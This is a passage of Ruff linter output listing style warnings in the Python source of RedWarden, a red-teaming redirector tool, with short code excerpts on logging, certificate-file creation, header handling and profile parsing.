67 |                 col = ProxyLogger.colors_map[col]
68 |         else:
   |

SIM118 Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:66:37
   |
64 |         if args["color"]:
65 |             col = args["color"]
66 |             if type(col) == str and col in ProxyLogger.colors_map.keys():
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
67 |                 col = ProxyLogger.colors_map[col]
68 |         else:
   |
help: Remove `.keys()`

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:77:20
   |
75 |         prefix = ""
76 |         if mode:
77 |             mode = "[%s] " % mode
   |                    ^^^^^^^^^^^^^^
78 |
79 |         if not args["noprefix"]:
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:81:51
   |
79 |         if not args["noprefix"]:
80 |             prefix = ProxyLogger.with_color(
81 |                 ProxyLogger.colors_dict["other"], "%s%s: " % (mode.upper(), tm)
   |                                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
82 |             )
   |
help: Replace with format specifiers

SIM102 Use a single `if` statement instead of nested `if` statements
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:85:9
   |
84 |           nl = ""
85 | /         if "newline" in args:
86 | |             if args["newline"]:
   | |_______________________________^
87 |                   nl = "\n"
   |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:89:12
   |
87 |                 nl = "\n"
88 |
89 |         if type(fd) == str:
   |            ^^^^^^^^^^^^^^^
90 |             prefix2 = "%s%s: " % (mode.upper(), tm)
91 |             line = prefix2 + txt + nl
   |

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:90:23
   |
89 |         if type(fd) == str:
90 |             prefix2 = "%s%s: " % (mode.upper(), tm)
   |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
91 |             line = prefix2 + txt + nl
92 |             ProxyLogger.writeToLogfile(fd, line)
   |
help: Replace with format specifiers

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:94:16
   |
92 |             ProxyLogger.writeToLogfile(fd, line)
93 |
94 |             if "tee" in args.keys() and args["tee"]:
   |                ^^^^^^^^^^^^^^^^^^^^
95 |                 with globalLock:
96 |                     sys.stdout.write(prefix + ProxyLogger.with_color(col, txt) + nl)
   |
help: Remove `.keys()`

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\proxylogger.py:103:9
    |
101 |       @staticmethod
102 |       def writeToLogfile(fd, line):
103 | /         with globalLock:
104 | |             with open(fd, "a") as f:
    | |____________________________________^
105 |                   f.write(line)
106 |                   f.flush()
    |
help: Combine `with` statements

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\sslintercept.py:33:33
   |
31 |                 )
32 |                 self.options["certdir"] = path
33 |                 self.logger.dbg('Using path: "%s"' % self.options["certdir"])
   |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
34 |
35 |             # Step 1: Create directory for certificates and asynchronous encryption keys
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\sslintercept.py:39:25
   |
37 |                   try:
38 |                       self.logger.dbg(
39 | /                         "Creating directory for certificate: '%s'"
40 | |                         % self.options["certdir"]
   | |_________________________________________________^
41 |                       )
42 |                       os.mkdir(self.options["certdir"])
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\sslintercept.py:45:25
   |
43 |                 except Exception as e:
44 |                     self.logger.fatal(
45 |                         "Couldn't make directory for certificates: '%s'" % e
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
46 |                     )
47 |                     return False
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\sslintercept.py:55:25
   |
53 |                 if not os.path.isdir(self.options["cakey"]):
54 |                     self.logger.dbg(
55 |                         "Creating CA key file: '%s'" % self.options["cakey"]
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
56 |                     )
57 |                     p = Popen(
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\sslintercept.py:80:25
   |
78 |                 if not os.path.isdir(self.options["cacert"]):
79 |                     self.logger.dbg(
80 |                         "Creating CA certificate file: '%s'" % self.options["cacert"]
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
81 |                     )
82 |                     p = Popen(
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\sslintercept.py:124:25
    |
122 |                 if not os.path.isdir(self.options["certkey"]):
123 |                     self.logger.dbg(
124 |                         "Creating Certificate key file: '%s'" % self.options["certkey"]
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
125 |                     )
126 |                     self.logger.dbg(
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\sslintercept.py:127:25
    |
125 |                     )
126 |                     self.logger.dbg(
127 |                         "Creating CA key file: '%s'" % self.options["cakey"]
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
128 |                     )
129 |                     p = Popen(
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\sslintercept.py:172:37
    |
170 |                 absfile = os.path.abspath(file)
171 |                 if absfile in self.dontRemove:
172 |                     self.logger.dbg('SSL file not cleaned: "{}"'.format(absfile))
    |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
173 |                     continue
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\sslintercept.py:175:33
    |
173 |                     continue
174 |
175 |                 self.logger.dbg("Removing old certificate: {}".format(absfile))
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
176 |                 os.remove(absfile)
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\sslintercept.py:182:17
    |
180 |         except Exception as e:
181 |             self.logger.err(
182 |                 "Couldn't perform SSL interception files cleaning: '%s'" % e
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
183 |             )
    |
help: Replace with format specifiers

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 | #
  |
help: Remove unnecessary coding comment

F841 Local variable `s` is assigned to but never used
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:15:5
   |
14 | def hexdump(data):
15 |     s = ""
   |     ^
16 |     n = 0
17 |     lines = []
   |
help: Remove assignment to unused variable `s`

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:27:17
   |
25 |     for i in range(0, len(data), 16):
26 |         line = ""
27 |         line += "%04x | " % (i)
   |                 ^^^^^^^^^^^^^^^
28 |         n += 16
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:44:21
   |
42 |                 break
43 |             c = data[j] if not (data[j] < 0x20 or data[j] > 0x7E) else "."
44 |             line += "%c" % c
   |                     ^^^^
45 |
46 |         line = line.ljust(74, " ") + " |"
   |
help: Replace with format specifiers

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:80:13
   |
79 |           if (
80 | /             plugins.IProxyPlugin.proxy2_metadata_headers[
81 | |                 "strip_headers_during_forward"
82 | |             ].lower()
83 | |             in headers2.keys()
   | |______________________________^
84 |           ):
85 |               strips = headers2[
   |
help: Remove `.keys()`

B007 Loop control variable `k` not used within loop body
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:97:13
   |
95 |             )
96 |
97 |         for k, v in plugins.IProxyPlugin.proxy2_metadata_headers.items():
   |             ^
98 |             if v.lower() in headers2.keys():
99 |                 strip_these_headers.append(v)
   |
help: Rename unused `k` to `_k`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:98:16
   |
97 |         for k, v in plugins.IProxyPlugin.proxy2_metadata_headers.items():
98 |             if v.lower() in headers2.keys():
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
99 |                 strip_these_headers.append(v)
   |
help: Remove `.keys()`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:107:35
    |
105 |                         headers[h2] = drop_this_header
106 |
107 |                 if len(h) > 0 and h.lower() not in headers2.keys():
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
108 |                     headers[h] = drop_this_header
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:126:24
    |
124 |             if v == drop_this_header:
125 |                 continue
126 |             reqhdrs += "\t{}: {}\r\n".format(k, v)
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
127 |
128 |         b = body
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:129:17
    |
128 |         b = body
129 |         if b != None and type(b) == bytes:
    |                 ^^^^
130 |             b = body.decode(errors="ignore")
    |
help: Replace with `cond is not None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:129:26
    |
128 |         b = body
129 |         if b != None and type(b) == bytes:
    |                          ^^^^^^^^^^^^^^^^
130 |             b = body.decode(errors="ignore")
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:136:20
    |
134 |         )
135 |
136 |         logger.dbg("SENDING REVERSE-PROXY REQUEST to [{}]:\n\n{}".format(host, request))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
137 |         return method(self, _method, url, body, headers3, encode_chunked)
    |
help: Convert to f-string

B010 [*] Do not call `setattr` with a constant attribute value. It is not any safer than normal property access.
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:146:5
    |
144 |       logger = log
145 |
146 | /     setattr(
147 | |         http.client.HTTPConnection,
148 | |         "putheader",
149 | |         putheader_decorator(http.client.HTTPConnection.putheader),
150 | |     )
    | |_____^
151 |       setattr(
152 |           http.client.HTTPConnection,
    |
help: Replace `setattr` with assignment

B010 [*] Do not call `setattr` with a constant attribute value. It is not any safer than normal property access.
   --> security\penetration-testing-tools\red-teaming\RedWarden\lib\utils.py:151:5
    |
149 |           putheader_decorator(http.client.HTTPConnection.putheader),
150 |       )
151 | /     setattr(
152 | |         http.client.HTTPConnection,
153 | |         "_send_request",
154 | |         send_request_decorator(http.client.HTTPConnection._send_request),
155 | |     )
    | |_____^
    |
help: Replace `setattr` with assignment

N999 Invalid module name: 'IProxyPlugin'
--> security\penetration-testing-tools\red-teaming\RedWarden\plugins\IProxyPlugin.py:1:1

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\IProxyPlugin.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 |
4 | from abc import ABC, abstractmethod
  |
help: Remove unnecessary coding comment

N818 Exception name `DropConnectionException` should be named with an Error suffix
  --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\IProxyPlugin.py:18:7
   |
18 | class DropConnectionException(Exception):
   |       ^^^^^^^^^^^^^^^^^^^^^^^
19 |     def __init__(self, txt):
20 |         super().__init__("DropConnectionException: " + txt)
   |

N818 Exception name `DontFetchResponseException` should be named with an Error suffix
  --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\IProxyPlugin.py:23:7
   |
23 | class DontFetchResponseException(Exception):
   |       ^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |     def __init__(self, txt):
25 |         super().__init__("DontFetchResponseException: " + txt)
   |

N803 Argument name `proxyOptions` should be lowercase
  --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\IProxyPlugin.py:29:32
   |
28 | class IProxyPlugin(ABC):
29 |     def __init__(self, logger, proxyOptions):
   |                                ^^^^^^^^^^^^
30 |         super().__init__()
   |

F401 [*] `pprint` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:39:8
   |
37 | import os
38 | import os.path
39 | import pprint
   |        ^^^^^^
40 | import random
41 | import re
   |
help: Remove unused import: `pprint`

F401 [*] `sys` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:43:8
   |
41 | import re
42 | import socket
43 | import sys
   |        ^^^
44 | import time
45 | from datetime import datetime
   |
help: Remove unused import: `sys`

F401 [*] `time` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:44:8
   |
42 | import socket
43 | import sys
44 | import time
   |        ^^^^
45 | from datetime import datetime
46 | from urllib.parse import parse_qs, parse_qsl, urlparse, urlsplit
   |
help: Remove unused import: `time`

F401 [*] `urllib.parse.parse_qsl` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:46:36
   |
44 | import time
45 | from datetime import datetime
46 | from urllib.parse import parse_qs, parse_qsl, urlparse, urlsplit
   |                                    ^^^^^^^^^
47 |
48 | import requests
   |
help: Remove unused import: `urllib.parse.parse_qsl`

F401 [*] `requests` imported but unused
  --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:48:8
   |
46 | from urllib.parse import parse_qs, parse_qsl, urlparse, urlsplit
47 |
48 | import requests
   |        ^^^^^^^^
49 | import yaml
50 | from lib.ipLookupHelper import IPGeolocationDeterminant, IPLookupHelper
   |
help: Remove unused import: `requests`

F403 `from plugins.IProxyPlugin import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:53:1
   |
51 | from sqlitedict import SqliteDict
52 |
53 | from plugins.IProxyPlugin import *
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
54 |
55 | BANNED_AGENTS = []
   |

N816 Variable `alreadyPrintedPeers` in global scope should not be mixedCase
  --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:57:1
   |
55 | BANNED_AGENTS = []
56 | OVERRIDE_BANNED_AGENTS = []
57 | alreadyPrintedPeers = set()
   | ^^^^^^^^^^^^^^^^^^^
   |

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:104:29
    |
102 |     def parse(self, path):
103 |         try:
104 |             with open(path, "r") as f:
    |                             ^^^
105 |                 self.data = f.read().replace("\r\n", "\n")
106 |                 self.datalines = self.data.split("\n")
    |
help: Remove mode argument

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:109:37
    |
107 |                 self.datalines.append("\n")
108 |
109 |         except FileNotFoundError as e:
    |                                     ^
110 |             self.logger.fatal(
111 |                 "Malleable profile specified in redirector's config file (profile) doesn't exist: ({})".format(
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:111:17
    |
109 |           except FileNotFoundError as e:
110 |               self.logger.fatal(
111 | /                 "Malleable profile specified in redirector's config file (profile) doesn't exist: ({})".format(
112 | |                     path
113 | |                 )
    | |_________________^
114 |               )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:142:42
    |
140 |               line = self.datalines[linenum]
141 |
142 |               assert len(dynkey) == depth, "Depth ({}) and dynkey differ ({})".format(
    |  __________________________________________^
143 | |                 depth, dynkey
144 | |             )
    | |_____________^
145 |
146 |               if line.strip() == "":
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:158:21
    |
156 |               if len(line) > 100:
157 |                   self.logger.dbg(
158 | /                     "[key: {}, line: {}, pos: {}] {}...{}".format(
159 | |                         str(dynkey), linenum, pos, line[:50], line[-50:]
160 | |                     )
    | |_____________________^
161 |                   )
162 |               else:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:164:21
    |
162 |               else:
163 |                   self.logger.dbg(
164 | /                     "[key: {}, line: {}, pos: {}] {}".format(
165 | |                         str(dynkey), linenum, pos, line[:100]
166 | |                     )
    | |_____________________^
167 |                   )
    |
help: Convert to f-string

SIM108 Use ternary operator `parsed = parsed[sect][variant] if len(variant) > 0 else parsed[sect]` instead of `if`-`else`-block
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:172:17
    |
170 |               for key in dynkey:
171 |                   sect, variant = key
172 | /                 if len(variant) > 0:
173 | |                     parsed = parsed[sect][variant]
174 | |                 else:
175 | |                     parsed = parsed[sect]
    | |_________________________________________^
176 |
177 |               matched = False
    |
help: Replace `if`-`else`-block with `parsed = parsed[sect][variant] if len(variant) > 0 else parsed[sect]`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:187:25
    |
185 |             n = compregexes["begin-section-and-variant"].match(twolines)
186 |             if m or n:
187 |                 if m == None and n != None:
    |                         ^^^^
188 |                     self.logger.dbg(
189 |                         'Section opened in a new line: [{}] = ["{}"]'.format(
    |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:187:39
    |
185 |             n = compregexes["begin-section-and-variant"].match(twolines)
186 |             if m or n:
187 |                 if m == None and n != None:
    |                                       ^^^^
188 |                     self.logger.dbg(
189 |                         'Section opened in a new line: [{}] = ["{}"]'.format(
    |
help: Replace with `cond is not None`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:202:20
    |
200 |                 variant = ""
201 |
202 |                 if section not in parsed.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
203 |                     parsed[section] = {}
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:222:21
    |
221 |                 self.logger.dbg(
222 |                     "Extracted section: [{}] (variant: {})".format(section, variant)
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
223 |                 )
    |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:238:20
    |
236 |                 variant = ""
237 |
238 |                 if sect in parsed.keys() and "variant" in parsed[sect][variant].keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^
239 |                     variant = "(variant: {})".format(variant)
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:238:46
    |
236 |                 variant = ""
237 |
238 |                 if sect in parsed.keys() and "variant" in parsed[sect][variant].keys():
    |                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
239 |                     variant = "(variant: {})".format(variant)
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:239:31
    |
238 |                 if sect in parsed.keys() and "variant" in parsed[sect][variant].keys():
239 |                     variant = "(variant: {})".format(variant)
    |                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
240 |
241 |                 self.logger.dbg("Reached end of section {}.{}".format(sect, variant))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:241:33
    |
239 |                     variant = "(variant: {})".format(variant)
240 |
241 |                 self.logger.dbg("Reached end of section {}.{}".format(sect, variant))
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
242 |                 pos += len(line)
243 |                 linenum += 1
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:248:48
    |
246 |             m = compregexes["set-name-value"].match(line)
247 |             if m:
248 |                 n = list(filter(lambda x: x != None, m.groups()[2:]))[0]
    |                                                ^^^^
249 |
250 |                 val = n.replace("\\\\", "\\")
    |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:268:25
    |
266 |                     parsed[param] = val
267 |                     self.logger.dbg(
268 |                         "Extracted variable: [{}] = [{}]".format(param, val)
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
269 |                     )
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:279:56
    |
277 |             m = compregexes["set-parameter-value"].search(line)
278 |             if m:
279 |                 paramname = list(filter(lambda x: x != None, m.groups()))[0]
    |                                                        ^^^^
280 |                 restofline = line[line.find(paramname) + len(paramname) :]
281 |                 values = []
    |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:284:25
    |
283 |                 n = compregexes["prepend-append-value"].search(line)
284 |                 if n != None and len(n.groups()) > 1:
    |                         ^^^^
285 |                     paramname = n.groups()[0]
286 |                     paramval = n.groups()[1].replace("\\\\", "\\")
    |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:289:25
    |
287 |                     values.append(paramval)
288 |                     self.logger.dbg(
289 |                         'Extracted {} value: "{}..."'.format(paramname, paramval[:20])
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
290 |                     )
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:294:63
    |
292 |                 else:
293 |                     for n in compregexes["parameter-value"].finditer(restofline):
294 |                         paramval = list(filter(lambda x: x != None, n.groups()[1:]))[0]
    |                                                               ^^^^
295 |                         values.append(paramval.replace("\\\\", "\\"))
    |
help: Replace with `cond is not None`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:302:20
    |
300 |                     values = values[0]
301 |
302 |                 if paramname in parsed.keys():
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^
303 |                     if type(parsed[paramname]) == list:
304 |                         parsed[paramname].append(values)
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:303:24
    |
302 |                 if paramname in parsed.keys():
303 |                     if type(parsed[paramname]) == list:
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
304 |                         parsed[paramname].append(values)
305 |                     else:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:308:24
    |
306 |                         parsed[paramname] = [parsed[paramname], values]
307 |                 else:
308 |                     if type(values) == list:
    |                        ^^^^^^^^^^^^^^^^^^^^
309 |                         parsed[paramname] = [
310 |                             values,
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:316:21
    |
315 |                   self.logger.dbg(
316 | /                     "Extracted complex variable: [{}] = [{}]".format(
317 | |                         paramname, str(values)[:100]
318 | |                     )
    | |_____________________^
319 |                   )
    |
help: Convert to f-string

W605 [*] Invalid escape sequence: `\s`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:338:38
    |
337 |                 while lineidx < 100 and lineidx + linenum < len(self.datalines):
338 |                     if re.match('.*";\s*$', self.datalines[lineidx + linenum]):
    |                                      ^^
339 |                         self.logger.dbg(
340 |                             f"Found end of prepend/append instruction at line: {linenum+lineidx}"
    |
help: Use a raw string literal

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:352:33
    |
350 |                         if m:
351 |                             self.logger.dbg(
352 |                                 f"Extracted multi-line prepend/append instruction."
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
353 |                             )
    |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:364:32
    |
362 |                                 values = values[0]
363 |
364 |                             if paramname in parsed.keys():
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^
365 |                                 if type(parsed[paramname]) == list:
366 |                                     parsed[paramname].append(values)
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:365:36
    |
364 | ΓÇª                     if paramname in parsed.keys():
365 | ΓÇª                         if type(parsed[paramname]) == list:
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
366 | ΓÇª                             parsed[paramname].append(values)
367 | ΓÇª                         else:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:370:36
    |
368 | ΓÇª                             parsed[paramname] = [parsed[paramname], values]
369 | ΓÇª                     else:
370 | ΓÇª                         if type(values) == list:
    |                              ^^^^^^^^^^^^^^^^^^^^
371 | ΓÇª                             parsed[paramname] = [
372 | ΓÇª                                 values,
    |

F841 Local variable `matched` is assigned to but never used
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:379:29
    |
377 | ΓÇª                     linenum += lineidx + 1
378 | ΓÇª                     pos += len(longline)
379 | ΓÇª                     matched = "prepend-append"
    |                       ^^^^^^^
380 | ΓÇª                     cancont = True
    |
help: Remove assignment to unused variable `matched`

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:384:33
    |
382 |                         else:
383 |                             self.logger.dbg(
384 |                                 f"Extracted prepend/append instruction IS NOT valid!"
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
385 |                             )
386 |                             self.logger.dbg(
    |
help: Remove extraneous `f` prefix

B007 Loop control variable `v` not used within loop body
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:421:16
    |
420 |     def normalize(self):
421 |         for k, v in self.config.items():
    |                ^
422 |             if k in MalleableParser.ProtocolTransactions:
423 |                 if k == "http-get" and "verb" not in self.config[k].keys():
    |
help: Rename unused `v` to `_v`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:423:40
    |
421 |         for k, v in self.config.items():
422 |             if k in MalleableParser.ProtocolTransactions:
423 |                 if k == "http-get" and "verb" not in self.config[k].keys():
    |                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
424 |                     self.config[k]["verb"] = "GET"
425 |                 elif k == "http-post" and "verb" not in self.config[k].keys():
    |
help: Remove `.keys()`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:425:43
    |
423 |                 if k == "http-get" and "verb" not in self.config[k].keys():
424 |                     self.config[k]["verb"] = "GET"
425 |                 elif k == "http-post" and "verb" not in self.config[k].keys():
